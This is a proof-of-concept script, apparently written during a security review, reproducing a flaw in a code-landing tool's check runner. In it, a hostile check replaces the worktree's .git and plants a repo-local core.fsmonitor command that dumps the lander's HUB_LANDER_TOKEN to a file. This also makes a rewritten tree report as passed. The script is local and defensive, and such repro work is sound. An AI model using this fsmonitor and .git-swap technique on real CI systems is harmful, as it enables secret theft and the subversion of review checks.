// Repro for R-1: after a check exits, the lander runs `git status` inside the
// check's worktree (ChecksRunner.dirty -> open(wt,{isolated:true}).run(['status',...])).
// open() sees wt/.git and so passes NO --git-dir / --work-tree; cwd is wt, so git
// discovers the repository through wt/.git -- which the check could have replaced.
// The lander's isolation turns off only global/system config and client hooks
// (core.hooksPath=/dev/null); it does NOT neutralise repository-local settings
// such as core.fsmonitor, which make git run a named command. That command runs
// as the LANDER process (not inside checkWrapper), with the lander's environment
// -- including HUB_LANDER_TOKEN, which checkEnvironment() never gives to a check.
// The same planted repo also controls what dirty() reports, so a check that
// rewrote the tracked tree can come back `passed` instead of `checks_modified_tree`.
//
// No network, no API key, no container: everything is local. The script exits
// non-zero exactly when the defect is present.
//
// Run:
//   AGENTHUB_ROOT=/home/user/agenthub node \
//     /tmp/claude-0/-home-user-agenthub/8b8b52f8-98ca-5efe-ba8a-d267c5f2c650/scratchpad/work-p23/review/repro-R-1/repro.mjs

import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, existsSync, readFileSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const ROOT = process.env.AGENTHUB_ROOT ?? '/home/user/agenthub';
const { ChecksRunner } = await import(path.join(ROOT, 'packages/lander/dist/checks.js'));

const tmp = mkdtempSync(path.join(os.tmpdir(), 'repro-R1-'));
const gitEnv = {
  ...process.env,
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_AUTHOR_NAME: 'a', GIT_AUTHOR_EMAIL: 'a@x',
  GIT_COMMITTER_NAME: 'a', GIT_COMMITTER_EMAIL: 'a@x',
};
const git = (cwd, ...args) => execFileSync('git', args, { cwd, env: gitEnv, encoding: 'utf8' }).trim();

// A source repo with one tracked file, cloned to a local bare mirror. No network.
const src = path.join(tmp, 'src');
git(tmp, 'init', '-q', '-b', 'main', src);
writeFileSync(path.join(src, 'app.txt'), 'the real, reviewed contents\n');
git(src, 'add', '-A');
git(src, 'commit', '-qm', 'c1');
const candidate = git(src, 'rev-parse', 'HEAD');
const mirror = path.join(tmp, 'mirror.git');
git(tmp, 'clone', '-q', '--bare', src, mirror);

const workdir = path.join(tmp, 'work');
const tokenMarker = path.join(tmp, 'LANDER_TOKEN_LEAKED');
const whoamiMarker = path.join(tmp, 'RAN_AS');
rmSync(tokenMarker, { force: true });
rmSync(whoamiMarker, { force: true });

// A secret that the LANDER process holds. checkEnvironment() denies HUB_* to the
// check (NEVER_RE = /^(?:HUB_|ANTHROPIC_|GIT_)/i), so the check can never read it
// from its own environment. If it shows up in the marker, a command ran in the
// lander's process with the lander's env.
process.env.HUB_LANDER_TOKEN = 's3cret-lander-push-token';

// The hostile check: it sees only {wt} under checkWrapper in a real deployment.
// It (1) rewrites the tracked file to something other than the reviewed candidate,
// (2) throws away wt/.git and builds its OWN repo there whose committed tree matches
// the rewritten file (so a later `git status` is clean), and (3) plants a repo-local
// core.fsmonitor that names a command. Then it exits 0.
const check = [
  'echo rewritten-by-the-check > app.txt',          // tracked file no longer matches the candidate
  'rm -rf .git',                                     // drop the gitfile the lander wrote
  'git init -q -b main .',                           // a repo of the check's own, here at wt/.git
  'git add -A',
  'git -c user.name=x -c user.email=x@x commit -qm x',  // commit so `status` is clean
  `printf '[core]\\n\\tfsmonitor = "echo leaked=$HUB_LANDER_TOKEN > ${tokenMarker}; id -un > ${whoamiMarker} 2>/dev/null; false"\\n' >> .git/config`,
  'echo "check: exiting 0"',
  'exit 0',
].join(' && ');

const runner = new ChecksRunner({
  workdir,
  mirror,
  // The lander's own environment. Real landers pass process.env here (ChecksRunner
  // default); we pin PATH + HOME + the secret so the child git can run and the leak
  // is unambiguous.
  env: { PATH: process.env.PATH, HOME: process.env.HOME, HUB_LANDER_TOKEN: process.env.HUB_LANDER_TOKEN },
  passEnv: [],
  checkWrapper: null,
});

const r = await runner.run({
  landingId: 'L-1',
  attempt: 1,
  candidate,
  trunk: candidate,
  epoch: 'e1',
  command: check,
  timeoutMs: 60_000,
  checkEnv: {},
  allowDirtyTree: false,
  remote: 'origin',
  candidateRef: 'refs/agenthub/cand/x/L-1/abcd',
});

console.log(`status          : ${r.status}`);
console.log(`exit_code       : ${r.report.exit_code}`);
const leaked = existsSync(tokenMarker) ? readFileSync(tokenMarker, 'utf8').trim() : '(none)';
const ranAs = existsSync(whoamiMarker) ? readFileSync(whoamiMarker, 'utf8').trim() : '(unknown)';
console.log(`fsmonitor fired : ${existsSync(tokenMarker)}`);
console.log(`leaked marker   : ${leaked}`);
console.log(`ran as user     : ${ranAs}`);

// --- the two defect conditions ---
// (A) A command planted in repo-local config ran in the lander's process with the
//     lander's environment, exfiltrating a secret the check env never holds.
const commandRanInLander = existsSync(tokenMarker) && leaked.includes(process.env.HUB_LANDER_TOKEN);
// (B) The check rewrote the tracked tree yet the lander called it `passed`
//     (dirty() trusted the check's planted repo).
const treeRewrittenButPassed = r.status === 'passed';

console.log('');
console.log(`(A) lander ran a check-controlled command with its own env (token leak): ${commandRanInLander}`);
console.log(`(B) rewritten tracked tree reported as passed                          : ${treeRewrittenButPassed}`);

if (commandRanInLander || treeRewrittenButPassed) {
  console.error('\nDEFECT PRESENT (R-1): the lander ran git in the check-controlled worktree after the check.');
  rmSync(tmp, { recursive: true, force: true });
  process.exit(1);
}

console.log('\nNo defect: the lander did not run a check-controlled command and did not call a rewritten tree passed.');
rmSync(tmp, { recursive: true, force: true });
process.exit(0);
